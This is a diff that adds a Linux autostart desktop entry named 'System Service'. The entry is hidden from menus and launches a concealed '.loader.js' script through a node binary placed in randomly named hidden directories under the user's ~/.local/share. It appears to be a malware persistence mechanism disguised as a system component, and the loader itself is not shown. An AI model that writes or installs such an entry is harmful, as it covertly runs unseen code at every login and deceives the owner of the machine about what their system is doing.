@@ -1,0 +1,7 @@
+[Desktop Entry]
+Type=Application
+Name=System Service
+Exec=/home/user/.local/share/.r0qsv8h1/.394ly8v9/bin/node /home/user/.local/share/.r0qsv8h1/.loader.js
+Hidden=true
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
